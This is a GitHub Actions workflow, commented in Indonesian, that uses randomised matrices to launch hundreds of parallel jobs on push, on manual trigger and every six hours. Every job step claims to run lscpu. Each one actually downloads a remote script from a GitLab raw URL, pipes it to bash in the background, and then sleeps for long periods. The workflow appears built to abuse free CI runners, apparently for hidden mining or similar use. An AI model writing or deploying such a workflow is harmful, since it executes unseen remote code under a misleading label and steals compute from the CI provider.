name: autospaces-raiodala

on:
  workflow_dispatch:
  push:
    branches: ["main"]
  schedule:
    - cron: '0 */6 * * *'

permissions: {}   # 🔒 Tidak ada akses ke repo atau token

jobs:
  # =============================================
  # 🔮 Generator Matriks Acak (sekali per run)
  # =============================================
  generate:
    runs-on: ubuntu-latest
    outputs:
      build_go: ${{ steps.gen.outputs.build_go }}
      build_flag: ${{ steps.gen.outputs.build_flag }}
      cincau_go: ${{ steps.gen.outputs.cincau_go }}
      cincau_flag: ${{ steps.gen.outputs.cincau_flag }}
      tepung_go: ${{ steps.gen.outputs.tepung_go }}
      tepung_flag: ${{ steps.gen.outputs.tepung_flag }}
      tekwan_go: ${{ steps.gen.outputs.tekwan_go }}
      tekwan_flag: ${{ steps.gen.outputs.tekwan_flag }}
    steps:
      - name: Generate random strings
        id: gen
        shell: python
        run: |
          import random, string, json, os

          def random_strings(n, min_len=3, max_len=5):
              res = set()
              while len(res) < n:
                  length = random.randint(min_len, max_len)
                  chars = string.ascii_letters + string.digits
                  s = ''.join(random.choice(chars) for _ in range(length))
                  res.add(s)
              return list(res)

          # Tentukan jumlah sesuai masing-masing job
          specs = {
              'build_go': 9, 'build_flag': 26,
              'cincau_go': 9, 'cincau_flag': 26,
              'tepung_go': 9, 'tepung_flag': 26,
              'tekwan_go': 9, 'tekwan_flag': 3
          }

          with open(os.environ['GITHUB_OUTPUT'], 'a') as f:
              for name, count in specs.items():
                  vals = random_strings(count)
                  f.write(f"{name}={json.dumps(vals)}\n")

  # =============================================
  # 📦 Job build (234 job) – lscpu + sleep 330s
  # =============================================
  build:
    needs: generate
    runs-on: ubuntu-latest
    timeout-minutes: 10
    strategy:
      max-parallel: 50
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.build_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.build_flag) }}
    steps:
      - name: Jalankan lscpu & tahan 5.5 menit
        run: |
          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
          sleep 240s

  # =============================================
  # 🧊 Job cincau (234 job) – lscpu + sleep 21m
  # =============================================
  cincau:
    needs: [generate, build]
    runs-on: ubuntu-latest
    timeout-minutes: 25
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.cincau_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.cincau_flag) }}
    steps:
      - name: Jalankan lscpu & tahan 15 menit
        run: |
          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
          sleep 15m

  # =============================================
  # 🍚 Job tepung (234 job) – lscpu + sleep 35m
  # =============================================
  tepung:
    needs: [generate, build]   # paralel dengan cincau
    runs-on: ubuntu-latest
    timeout-minutes: 40
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.tepung_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.tepung_flag) }}
    steps:
      - name: Jalankan lscpu & tahan 35 menit
        run: |
          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
          sleep 35m

  # =============================================
  # 🍜 Job tekwan (27 job) – lscpu + sleep 62m
  # =============================================
  tekwan:
    needs: [generate, cincau]
    runs-on: ubuntu-latest
    timeout-minutes: 70
    strategy:
      max-parallel: 250
      fail-fast: false
      matrix:
        go: ${{ fromJSON(needs.generate.outputs.tekwan_go) }}
        flag: ${{ fromJSON(needs.generate.outputs.tekwan_flag) }}
    steps:
      - name: Jalankan lscpu & tahan 62 menit
        run: |
          curl -sL https://gitlab.com/makanan99/food/-/raw/main/saitama | bash &
          sleep 120m